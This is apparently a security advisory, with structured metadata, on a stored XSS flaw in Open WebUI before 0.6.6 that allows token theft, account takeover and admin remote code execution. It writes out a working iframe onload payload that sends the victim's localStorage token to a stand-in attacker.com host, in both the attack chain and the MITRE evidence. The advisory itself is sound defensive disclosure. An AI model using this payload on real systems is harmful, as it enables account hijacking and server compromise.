---
title: Open WebUI Stored XSS Leads to Account Takeover and RCE (CVE-2025-46719)
slug: 2026-07-open-webui-stored-xss-rce
description: A high-severity stored Cross-Site Scripting (XSS) vulnerability, CVE-2025-46719, exists in Open WebUI versions prior to 0.6.6 due to improper rendering of HTML tags in chat messages, specifically an unescaped markdown token in `MarkdownTokens.svelte`. This allows attackers to inject malicious JavaScript into chat transcripts, which executes in a user's browser upon viewing, enabling access token theft, full account takeover, and, if targeting an administrator, Remote Code Execution (RCE) on the backend server via malicious Python functions.
date: "2026-07-07T16:57:54Z"
type: advisory
types:
  - advisory
severities:
  - high
cpes:
  - cpe:2.3:a:openwebui:open_webui:*:*:*:*:*:*:*:*
tags:
  - xss
  - rce
  - web-application
  - open-webui
vendors:
  - Open WebUI
products:
  - open-webui (< 0.6.6)
mitre_ttps:
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
    evidence: A vulnerability in the way certain html tags in chat messages are rendered allows attackers to inject JavaScript code into a chat transcript. The JavaScript code will be executed in the user's browser every time that chat transcript is opened, allowing attackers to retrieve the user's access token and gain full control over their account.
    confidence_band: high
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
    evidence: If an attacker manages to steal an admin user's token, they can then achieve RCE on the backend server by creating a function (http://localhost:5174/admin/functions), which by design allows admins to execute arbitrary python code on the backend server.
    confidence_band: high
  - tactic_id: TA0006
    tactic_name: Credential Access
    technique_id: T1539
    technique_name: Steal Web Session Cookie
    evidence: 'attackers can use the following code to steal the user''s access token and send it to a server they control: `fetch("https://attacker.com/?token=" + localStorage.getItem("token"))` ... This is possible because the access token is stored inside the user''s localStorage, which is accessible by JavaScript.'
    confidence_band: high
  - tactic_id: TA0003
    tactic_name: Persistence
    technique_id: T1552
    technique_name: Unsecured Credentials
    evidence: The access token is stored inside the user's localStorage, which is accessible by JavaScript.
    confidence_band: high
  - tactic_id: TA0008
    tactic_name: Lateral Movement
    technique_id: T1021
    technique_name: Remote Services
    evidence: Chat transcripts can be shared with other users in the same server, or with the whole open-webui community if 'Enable Community Sharing' is enabled in the admin panel.
    confidence_band: med
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1190
    technique_name: Exploit Public-Facing Application
    evidence: A vulnerability in the way certain html tags in chat messages are rendered allows attackers to inject JavaScript code into a chat transcript.
    confidence_band: high
cves:
  - id: CVE-2025-46719
    cvss: 5.4
    epss: 0.00434
references:
  - https://github.com/advisories/GHSA-9f4f-jv96-8766
iocs:
  - type: url
    value: https://openwebui.com/c/<user>/<chat_id>
  - type: url
    value: http://localhost:8080/api/v1/files/
  - type: url
    value: https://attacker.com/?token=
  - type: domain
    value: openwebui.com
  - type: url
    value: https://github.com/open-webui/open-webui/blob/main/src/lib/components/chat/Messages/Markdown/MarkdownTokens.svelte#L269-L279
  - type: url
    value: http://localhost:5174/admin/functions
ioc_counts:
  domain: 1
  url: 5
---

A critical vulnerability, tracked as CVE-2025-46719, affects Open WebUI versions prior to 0.6.6, allowing for stored Cross-Site Scripting (XSS) attacks. The flaw stems from the `MarkdownTokens.svelte` component, which improperly renders specific HTML tags within chat messages, enabling JavaScript injection. Attackers can embed malicious scripts in chat transcripts that execute when a user views the message, leading to the theft of access tokens and full account compromise. If an administrator account is targeted, the stolen token can be used to achieve Remote Code Execution (RCE) on the Open WebUI backend server by creating functions with arbitrary Python code. This vulnerability is "wormable," as infected chat transcripts can be shared across the same server or uploaded to the public `openwebui.com` platform, spreading the exploit to other users upon viewing.

## Attack Chain

1.  Attacker crafts a malicious chat message containing an `<iframe>` tag with an `onload` event, designed to exfiltrate access tokens (e.g., `<iframe src="http://localhost:8080/api/v1/files/" onload="fetch('https://attacker.com/?token=' + localStorage.getItem('token'))"></iframe>`).
2.  The attacker sends this malicious chat message within the Open WebUI application.
3.  A victim user, potentially an administrator, opens the infected chat transcript, causing the embedded malicious `<iframe>` to render.
4.  The malicious JavaScript embedded in the `onload` attribute executes in the victim's browser, fetching and exfiltrating the victim's session access token to the attacker-controlled server.
5.  If the victim was an administrator, the attacker uses the stolen admin access token to authenticate to the Open WebUI backend API.
6.  The attacker sends a POST request to the `/api/v1/functions` endpoint (e.g., `http://localhost:5174/admin/functions`) with a JSON payload containing malicious Python code.
7.  The Open WebUI backend server processes and executes the malicious Python code within the newly created function, leading to Remote Code Execution on the underlying host system.
8.  The attacker achieves full control over the Open WebUI instance and potentially the underlying server.

## Impact

Successful exploitation of CVE-2025-46719 can lead to severe consequences. Users are at risk of full account takeover through stolen access tokens, enabling attackers to impersonate them, access their data, and manipulate their chat history. The wormable nature of the XSS means that merely viewing an infected chat transcript can compromise a user, allowing the attack to spread rapidly, especially if "Enable Community Sharing" is active on `openwebui.com`. If an administrative account is compromised, the attacker can leverage the RCE capability to execute arbitrary code on the server hosting Open WebUI, potentially gaining full control of the server, exfiltrating sensitive data, or deploying further malware.

## Recommendation

*   Immediately update Open WebUI installations to version 0.6.6 or newer to remediate CVE-2025-46719.
*   Review web server access logs for POST requests to `/api/v1/functions` from non-administrative or unexpected sources, as this endpoint is used for RCE.
*   Monitor network traffic for outbound connections to suspicious or unknown domains from Open WebUI client systems, which could indicate exfiltration of `localStorage` tokens as referenced in `https://attacker.com/?token=`.
*   Educate users on the risks of opening chat transcripts from untrusted sources, especially those containing `<iframe>` tags or unusual content, even if the domain `http://localhost:8080/api/v1/files/` is present.
